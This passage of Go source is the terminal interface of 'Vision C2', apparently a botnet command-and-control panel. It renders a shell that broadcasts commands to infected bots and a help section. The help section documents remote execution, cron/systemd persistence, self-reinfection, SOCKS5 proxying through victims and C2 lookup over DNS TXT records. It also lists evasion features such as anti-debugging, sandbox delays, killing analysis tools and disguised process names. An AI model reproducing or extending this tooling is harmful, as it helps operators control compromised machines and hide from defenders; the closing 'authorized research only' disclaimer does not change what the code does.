	}
	if len(m.shellHistory) > 0 {
		b.WriteString(dim.Render("  Recent") + "\n")
		for i := historyStart; i < len(m.shellHistory); i++ {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonPink.Render("»"),
				white.Render(m.shellHistory[i])))
		}
	}

	// Pad to keep layout stable
	historyShown := len(m.shellHistory) - historyStart
	if historyShown > 0 {
		historyShown += 2 // label + info line
	} else {
		historyShown = 1 // info line
	}
	for i := historyShown; i < 11; i++ {
		b.WriteString("\n")
	}

	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n")

	// Input prompt or confirmation
	if m.confirmBroadcast {
		m.renderBroadcastConfirm(&b, neonGreen, neonRed, neonCyan, neonYellow, dim, white)
	} else {
		prompt := neonPink.Render("  » ")
		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("201")).Render("█")
		b.WriteString(prompt + m.shellInput + cursor)
		b.WriteString("\n\n")

		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
		b.WriteString(dim.Render("  [enter] Send   [↑/↓] History   [esc] Menu\n"))
		b.WriteString(fmt.Sprintf("  %s Arch   %s RAM   %s Max\n",
			hotkey.Render("[ctrl+a]"),
			hotkey.Render("[ctrl+g]"),
			hotkey.Render("[ctrl+n]")))
	}

	return b.String()
}

// renderBroadcastConfirm renders the confirmation prompt for broadcast commands
func (m TUIModel) renderBroadcastConfirm(b *strings.Builder,
	neonGreen, neonRed, neonCyan, neonYellow, dim, white lipgloss.Style) {

	warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true)
	targetCount := countFilteredBots(m.broadcastArch, m.broadcastMinRAM, m.broadcastMaxBots)

	// Truncate long commands for display
	displayCmd := m.pendingBroadcastCmd
	if len(displayCmd) > 50 {
		displayCmd = displayCmd[:47] + "..."
	}
	b.WriteString(warnStyle.Render(fmt.Sprintf("  Broadcast to %d bots:", targetCount)))
	b.WriteString("\n")
	b.WriteString("  " + neonCyan.Render(displayCmd))
	b.WriteString("\n")
	b.WriteString(fmt.Sprintf("  %s Confirm   %s Cancel\n",
		neonGreen.Render("[y]"),
		neonRed.Render("[n]")))
}

func (m TUIModel) viewHelp() string {
	var b strings.Builder

	// Styles
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonOrange := lipgloss.NewStyle().Foreground(lipgloss.Color("214"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	neonPurple := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))

	b.WriteString(headerStyle.Render("  ☾℣☽ HELP & DOCUMENTATION"))
	b.WriteString("\n\n")

	// Section tabs with page indicator
	sections := []string{"Start", "Keys", "Bots", "Shell", "SOCKS", "Net", "FAQ", "About"}
	for i, sec := range sections {
		if i == m.helpSection {
			b.WriteString(neonCyan.Bold(true).Render(" [" + sec + "] "))
		} else {
			b.WriteString(dim.Render("  " + sec + "  "))
		}
	}
	b.WriteString("\n")
	b.WriteString(dim.Render("  " + strings.Repeat("─", 70)))
	b.WriteString("\n")
	b.WriteString(dim.Render(fmt.Sprintf("  Page %d/%d", m.helpSection+1, len(sections))))
	b.WriteString("\n\n")

	switch m.helpSection {
	case 0: // Quick Start
		b.WriteString(neonPink.Bold(true).Render("  🚀 QUICK START GUIDE"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Overview") + "\n")
		b.WriteString(white.Render("  Vision is a command & control framework with a full") + "\n")
		b.WriteString(white.Render("  terminal UI. Navigate with arrow keys and hotkeys.") + "\n\n")

		b.WriteString(neonOrange.Render("  Getting Started") + "\n")
		steps := []struct{ step, desc string }{
			{"1.", "Dashboard loads on startup with live stats"},
			{"2.", "Use ↑/↓ and Enter to navigate the main menu"},
			{"3.", "Open Bot Management to view connected bots"},
			{"4.", "Select a bot and press Enter for remote shell"},
			{"5.", "Press q or Esc to go back at any time"},
		}
		for _, s := range steps {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(s.step),
				white.Render(s.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Main Menu Items") + "\n")
		menuItems := []struct{ item, desc string }{
			{"BOT MANAGEMENT", "View and manage connected bots"},
			{"SOCKS MANAGER", "SOCKS5 backconnect proxy"},
			{"BROADCAST SHELL", "Send commands to all bots"},
			{"HELP & INFO", "This documentation (you are here)"},
		}
		for _, mi := range menuItems {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-18s", mi.item)),
				dim.Render(mi.desc)))
		}

	case 1: // Navigation Controls
		b.WriteString(neonPink.Bold(true).Render("  ⌨️  NAVIGATION CONTROLS"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Global Keys (work in most views)") + "\n")
		globalKeys := []struct{ key, desc string }{
			{"↑ / k", "Move cursor up"},
			{"↓ / j", "Move cursor down"},
			{"← / h", "Previous tab / section"},
			{"→ / l", "Next tab / section"},
			{"enter", "Select / Confirm action"},
			{"tab", "Cycle through views"},
			{"1-4", "Jump directly to view"},
			{"r", "Refresh current data"},
			{"q", "Back to previous screen"},
			{"esc", "Return to main menu"},
			{"ctrl+c", "Quit application"},
		}
		for _, k := range globalKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

	case 2: // Bot Management
		b.WriteString(neonGreen.Bold(true).Render("  🤖 BOT MANAGEMENT"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Bot List View") + "\n")
		b.WriteString(white.Render("  Displays all connected bots with live statistics.") + "\n\n")
		columns := []struct{ col, desc string }{
			{"ID", "8-char unique bot identifier"},
			{"IP", "Bot IP address and port"},
			{"Arch", "CPU architecture (amd64, arm64, mips...)"},
			{"RAM", "Total system memory in MB"},
			{"CPU", "Number of CPU cores"},
			{"GEO", "Country code via GeoIP"},
			{"Process", "Disguised process name"},
			{"Uptime", "Time since bot connected"},
		}
		for _, c := range columns {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-10s", c.col)),
				dim.Render(c.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Bot Commands") + "\n")
		cmds := []struct{ cmd, desc string }{
			{"!persist", "Install cron/startup persistence"},
			{"!reinstall", "Force re-download and reinstall"},
			{"!lolnogtfo", "Kill and remove bot permanently"},
			{"!shell <cmd>", "Execute command, return output"},
			{"!exec <cmd>", "Execute command silently"},
			{"!detach <cmd>", "Execute in background"},
			{"!info", "Request bot system information"},
			{"!socks <port>", "Direct SOCKS5 listener on bot"},
			{"!socks <host:port>", "Relay backconnect to relay server"},
			{"!stopsocks", "Stop SOCKS5 proxy"},
		}
		for _, c := range cmds {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-15s", c.cmd)),
				dim.Render(c.desc)))
		}

	case 3: // Shell Controls
		b.WriteString(neonCyan.Bold(true).Render("  💻 SHELL CONTROLS"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Remote Shell (Single Bot)") + "\n")
		b.WriteString(dim.Render("  Interactive session with one bot. Select from Bot List.") + "\n\n")
		shellKeys := []struct{ key, desc string }{
			{"enter", "Execute typed command"},
			{"↑ / ↓", "Navigate command history"},
			{"pgup/pgdn", "Scroll output up/down"},
			{"ctrl+x", "Kill bot (requires y/n confirm)"},
			{"ctrl+f", "Clear shell output"},
			{"esc", "Return to main menu"},
		}
		for _, k := range shellKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Broadcast Shell (All Bots)") + "\n")
		b.WriteString(dim.Render("  Send commands to multiple bots simultaneously.") + "\n\n")
		broadcastKeys := []struct{ key, desc string }{
			{"enter", "Broadcast command to filtered bots"},
			{"ctrl+a", "Cycle arch filter (all/x86_64/aarch64/arm/mips)"},
			{"ctrl+g", "Cycle min RAM filter (0/512/1G/2G/4G MB)"},
			{"ctrl+n", "Cycle max bots limit (0/10/50/100/500)"},
			{"esc", "Return to main menu"},
		}
		for _, k := range broadcastKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Command Prefixes") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonCyan.Render("(none)     "), dim.Render("Sent as !shell <cmd> — waits for output")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonCyan.Render("!          "), dim.Render("Sent directly (e.g. !info, !detach ls)")))

	case 4: // SOCKS Proxy
		b.WriteString(neonPurple.Bold(true).Render("  🧦 SOCKS5 BACKCONNECT PROXY"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Overview") + "\n")
		b.WriteString(white.Render("  Bots connect OUT to a relay server (backconnect).") + "\n")
		b.WriteString(white.Render("  SOCKS5 clients connect to the relay — bot never opens a port.") + "\n")
		b.WriteString(white.Render("  C2 address stays hidden; relay is separate infrastructure.") + "\n\n")

		b.WriteString(neonOrange.Render("  Controls") + "\n")
		socksKeys := []struct{ key, desc string }{
			{"↑ / ↓", "Select a bot from the list"},
			{"s", "Quick start (pre-configured relay + creds)"},
			{"c", "Custom relay (enter relay:port + creds)"},
			{"d", "Direct mode (open SOCKS5 port on bot)"},
			{"x", "Stop proxy on selected bot"},
			{"← / →", "Switch view: All / Active / Stopped"},
			{"enter", "Confirm and connect (custom mode)"},
			{"esc", "Cancel input"},
			{"q", "Back to main menu"},
		}
		for _, k := range socksKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Relay Setup") + "\n")
		b.WriteString(white.Render("  1. Deploy relay binary on a VPS: ./relay -key <magic_code> -cp 9001 -sp 1080") + "\n")
		b.WriteString(white.Render("  2. Add relay in the Tor web panel (Relays tab) or use !socks <host:port>") + "\n")
		b.WriteString(white.Render("  3. SOCKS5 clients connect to relay's SOCKS port (default :1080)") + "\n")
		b.WriteString(white.Render("  4. All config via CLI args — no baked-in defaults, change relays anytime") + "\n\n")

		b.WriteString(neonOrange.Render("  Usage") + "\n")
		b.WriteString(white.Render("  curl --socks5 RELAY_IP:1080 http://target.com") + "\n")
		b.WriteString(white.Render("  proxychains4 nmap -sT target.com") + "\n")
		b.WriteString(dim.Render("  Relay endpoints can be pre-configured in setup.py") + "\n")

	case 5: // Network & Security
		b.WriteString(neonOrange.Bold(true).Render("  🔒 NETWORK & SECURITY"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Communication") + "\n")
		netInfo := []struct{ item, desc string }{
			{"Protocol", "EZF3 encrypted channel (ChaCha20 + X25519 + HMAC, port 443)"},
			{"Auth", "HMAC-SHA256 challenge-response with forward secrecy"},
			{"C2 Resolve", "DoH TXT → DNS TXT → A record → direct IP"},
			{"Encryption", "ChaCha20 + HMAC-SHA256 authenticated framing"},
			{"Keepalive", "2-second tick with auto-reconnect"},
		}
		for _, n := range netInfo {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-12s", n.item)),
				white.Render(n.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Bot Evasion") + "\n")
		evasion := []struct{ item, desc string }{
			{"Daemonize", "Fork to background, adopted by PID 1"},
			{"Single Inst", "PID lock file prevents duplicates"},
			{"Anti-Debug", "Detects 30+ analysis tools & debuggers"},
			{"Sandbox", "Random 24-27h delay if sandboxed"},
			{"Proc Scan", "Kills known analysis processes"},
			{"Stealth", "Disguised process name on startup"},
		}
		for _, e := range evasion {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-12s", e.item)),
				white.Render(e.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Persistence") + "\n")
		persist := []struct{ item, desc string }{
			{"Cron", "Auto-restart via cron job on reboot"},
			{"Startup", "Systemd/init.d startup scripts"},
			{"Reinfect", "Self-reinstall on binary removal"},
		}
		for _, p := range persist {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-12s", p.item)),
				white.Render(p.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Supported Architectures") + "\n")
		b.WriteString(white.Render("  amd64, 386, arm, arm64, mips, mipsle, mips64,") + "\n")
		b.WriteString(white.Render("  mips64le, ppc64, ppc64le, riscv64, s390x, loong64") + "\n")

	case 6: // Troubleshooting
		b.WriteString(neonYellow.Bold(true).Render("  🔧 TROUBLESHOOTING"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Bots Not Connecting") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Check firewall: ufw allow 443/tcp")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Verify C2 address in setup_config.txt")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Test EZF3: nc -zv IP 443")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Ensure protocol version matches (bot & server)")))

		b.WriteString("\n" + neonOrange.Render("  Port 443 Permission Denied") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Run as root: sudo ./server")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Or: sudo setcap 'cap_net_bind_service=+ep' ./server")))

		b.WriteString("\n" + neonOrange.Render("  TUI Display Issues") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Minimum terminal size: 80x24")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Use a terminal with 256-color support")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Try resizing or using screen/tmux")))

		b.WriteString("\n" + neonOrange.Render("  Build Errors") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Go not found: export PATH=$PATH:/usr/local/go/bin")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("m30w packer missing: ensure tools/upx exists")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("ARM/RISC-V error: update to latest build")))

		b.WriteString("\n" + neonOrange.Render("  Dead Bots") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Bots auto-cleaned after 5 min timeout")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Press r in Bot List to force refresh")))

	case 7: // About
		b.WriteString(neonPink.Bold(true).Render("  👁️  ABOUT VISION C2"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Project") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Name:"), neonCyan.Bold(true).Render("☾℣☽ VISION C2")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Version:"), white.Render("V2.5")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Protocol:"), white.Render("V1_2")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Language:"), white.Render("Go 1.23+")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("License:"), white.Render("GNU GPL")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("TUI:"), white.Render("BubbleTea + Lipgloss")))

		b.WriteString("\n" + neonOrange.Render("  Credits") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Developer:"), neonPink.Render("Syn")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Email:"), white.Render("hell@sinners.city")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("X/Twitter:"), white.Render("@synacket")))

		b.WriteString("\n" + neonOrange.Render("  Documentation") + "\n")
		docs := []struct{ file, desc string }{
			{"ARCHITECTURE.md", "Full system architecture deep-dive"},
			{"CHANGELOG.md", "Version history and release notes"},
			{"COMMANDS.md", "Complete TUI hotkey reference"},
			{"USAGE.md", "Setup, config, and usage guide"},
		}
		for _, d := range docs {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-18s", d.file)),
				dim.Render(d.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Legal") + "\n")
		b.WriteString(dim.Render("  For authorized security research and educational") + "\n")
		b.WriteString(dim.Render("  purposes only. Unauthorized use is illegal.") + "\n")
	}

	b.WriteString("\n")
	b.WriteString(dim.Render("  " + strings.Repeat("─", 70)))
	b.WriteString("\n")
	b.WriteString(fmt.Sprintf("  %s Prev  %s Next  %s Back\n",
		neonYellow.Render("[←/h]"),
		neonYellow.Render("[→/l]"),
		neonYellow.Render("[q]")))

	return b.String()
}

func (m TUIModel) renderStatusBar() string {
	// Check if toast has expired
	toast := ""
	if m.toastMessage != "" && time.Now().Before(m.toastExpiry) {
		toast = m.toastMessage
	}

	width := m.width
	if width == 0 {
		width = 120
	}

	// Suave status bar — minimal, elegant
	sbCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("117"))
	sbPurple := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
	sbGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	sbDim := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
	sbWhite := lipgloss.NewStyle().Foreground(lipgloss.Color("252"))

	uptime := getC2Uptime()

	archMap := getArchMap()
	archParts := []string{}
	for arch, count := range archMap {
		archParts = append(archParts, fmt.Sprintf("%s:%d", arch, count))
	}
	archStr := ""
	if len(archParts) > 0 {
		archStr = strings.Join(archParts, " ")
	}

	viewNames := []string{"dashboard", "bots", "socks", "help", "shell", "broadcast"}
	viewIdx := int(m.currentView)
	if viewIdx >= len(viewNames) {
		viewIdx = 0
	}

	leftSection := fmt.Sprintf(" %s %s %s %s %s %s %s %s",
		sbPurple.Render("☾℣☽"),
		sbCyan.Render("vision"),
		sbDim.Render("·"),
		sbGreen.Render("●"),
		sbDim.Render("·"),
		sbWhite.Render(fmt.Sprintf("%d", m.botCount)),
		sbDim.Render("·"),
		sbWhite.Render(formatRAM(m.totalRAM)))

	var archSection string
	if archStr != "" {
		archSection = fmt.Sprintf(" %s %s", sbDim.Render("·"), sbCyan.Render(archStr))
	}

	rightSection := fmt.Sprintf("%s %s %s %s ",
		sbDim.Render("·"),
		sbWhite.Render(uptime),
		sbDim.Render("·"),
		sbPurple.Render(viewNames[viewIdx]))

	rawLeft := fmt.Sprintf(" ☾℣☽ vision · ● · %d · %s", m.botCount, formatRAM(m.totalRAM))
	rawArch := ""
	if archStr != "" {
		rawArch = fmt.Sprintf(" · %s", archStr)
	}
	rawRight := fmt.Sprintf("· %s · %s ", uptime, viewNames[viewIdx])

	padding := width - len(rawLeft) - len(rawArch) - len(rawRight)
	if padding < 0 {
		padding = 0
	}

	bar := leftSection + archSection + strings.Repeat(" ", padding) + rightSection

	statusBar := lipgloss.NewStyle().
		Background(lipgloss.Color("235")).
		Width(width).
		Render(bar)

	if toast != "" {
		toastBar := lipgloss.NewStyle().
			Background(lipgloss.Color("234")).
			Width(width).
			Padding(0, 1).
			Render(toast)
		return statusBar + "\n" + toastBar
	}

	return statusBar
}

// NewTUIModel creates a new TUI model with default values
func NewTUIModel() TUIModel {
	return TUIModel{
		currentView: ViewDashboard,
		menuItems: []string{
			"BOT MANAGEMENT",
			"SOCKS MANAGER",
			"BROADCAST SHELL",
			"HELP & INFO",
			"EXIT",
		},
		menuCursor:   0,
		status:       "ONLINE",
		shellOutput:  []string{},
		shellHistory: []string{},
	}
}

// Global TUI program for external updates
var tuiProgram *tea.Program

// StartTUI starts the Bubble Tea TUI (for local console mode)
func StartTUI() error {
	m := NewTUIModel()
	m.botCount = getBotCount()
	m.totalRAM = getTotalRAM()
	m.totalCPU = getTotalCPU()

	p := tea.NewProgram(m, tea.WithAltScreen())
	tuiProgram = p
	_, err := p.Run()
	return err
}

// LogBotConnection adds a connection event to the TUI log
func LogBotConnection(arch string, connected bool) {
	if tuiProgram != nil {
		tuiProgram.Send(ConnLogMsg{Arch: arch, Connected: connected})
	}
}
